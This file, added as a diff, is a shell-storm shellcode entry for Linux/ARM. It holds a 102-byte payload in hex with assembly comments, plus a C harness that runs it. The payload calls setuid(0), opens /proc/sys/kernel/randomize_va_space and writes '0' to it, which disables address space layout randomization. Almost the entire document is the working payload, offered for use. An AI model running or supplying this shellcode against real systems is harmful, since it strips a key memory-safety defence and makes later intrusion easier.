@@ -1,0 +1,82 @@
+/*
+Title:  Linux/ARM - Disable ASLR Security - 102 bytes
+Date:   2010-06-30
+Tested: Linux ARM9 2.6.28-6-versatile
+
+Author: Jonathan Salwan
+Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
+
+! Database of shellcodes http://www.shell-storm.org/shellcode/
+
+
+Description:
+============
+ Address space layout randomization (ASLR) is a computer security technique 
+ which involves randomly arranging the positions of key data areas, usually 
+ including the base  of the executable and position of libraries, heap, and 
+ stack, in a process's address space.
+
+ This shellcode disables the ASLR on linux/ARM
+
+*/
+
+#include &lt;stdio.h&gt;
+
+char *SC = &quot;\x01\x30\x8f\xe2&quot;  // add    r3, pc, #1
+           &quot;\x13\xff\x2f\xe1&quot;  // bx     r3
+           &quot;\x24\x1b&quot;          // subs   r4, r4, r4
+           &quot;\x20\x1c&quot;          // adds   r0, r4, #0
+           &quot;\x17\x27&quot;          // movs   r7, #23
+           &quot;\x01\xdf&quot;          // svc    1
+           &quot;\x78\x46&quot;          // mov    r0, pc
+           &quot;\x2e\x30&quot;          // adds   r0, #46
+           &quot;\xc8\x21&quot;          // movs   r1, #200
+           &quot;\xc8\x31&quot;          // adds   r1, #200
+           &quot;\xc8\x31&quot;          // adds   r1, #200
+           &quot;\xc8\x31&quot;          // adds   r1, #200
+           &quot;\xc8\x31&quot;          // adds   r1, #200
+           &quot;\x59\x31&quot;          // adds   r1, #89
+           &quot;\xc8\x22&quot;          // movs   r2, #200
+           &quot;\xc8\x32&quot;          // adds   r2, #200
+           &quot;\x14\x32&quot;          // adds   r2, #20
+           &quot;\x05\x27&quot;          // movs   r7, #5
+           &quot;\x01\xdf&quot;          // svc    1
+           &quot;\x03\x20&quot;          // movs   r0, #3
+           &quot;\x79\x46&quot;          // mov    r1, pc
+           &quot;\x0e\x31&quot;          // adds   r1, #14
+           &quot;\x02\x22&quot;          // movs   r2, #2
+           &quot;\x04\x27&quot;          // movs   r7, #4
+           &quot;\x01\xdf&quot;          // svc    1
+           &quot;\x92\x1a&quot;          // subs   r2, r2, r2
+           &quot;\x10\x1c&quot;          // adds   r0, r2, #0
+           &quot;\x01\x27&quot;          // movs   r7, #1
+           &quot;\x01\xdf&quot;          // svc    1
+           
+           &quot;\x30\x0a&quot;          // ^
+           &quot;\x2d\x2d&quot;          // |
+           &quot;\x2f\x2f&quot;          // |
+           &quot;\x70\x72&quot;          // | 
+           &quot;\x6f\x63&quot;          // | 
+           &quot;\x2f\x73&quot;          // | 
+           &quot;\x79\x73&quot;          // | 
+           &quot;\x2f\x6b&quot;          // | 
+           &quot;\x65\x72&quot;          // | 
+           &quot;\x6e\x65&quot;          // |  [ strings ]
+           &quot;\x6c\x2f&quot;          // | 
+           &quot;\x72\x61&quot;          // | 
+           &quot;\x6e\x64&quot;          // | 
+           &quot;\x6f\x6d&quot;          // | 
+           &quot;\x69\x7a&quot;          // | 
+           &quot;\x65\x5f&quot;          // | 
+           &quot;\x76\x61&quot;          // | 
+           &quot;\x5f\x73&quot;          // |
+           &quot;\x70\x61&quot;          // | 
+           &quot;\x63\x65&quot;;         // v
+
+
+int main(void)
+{
+        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
+        (*(void(*)()) SC)();
+return 0;
+}
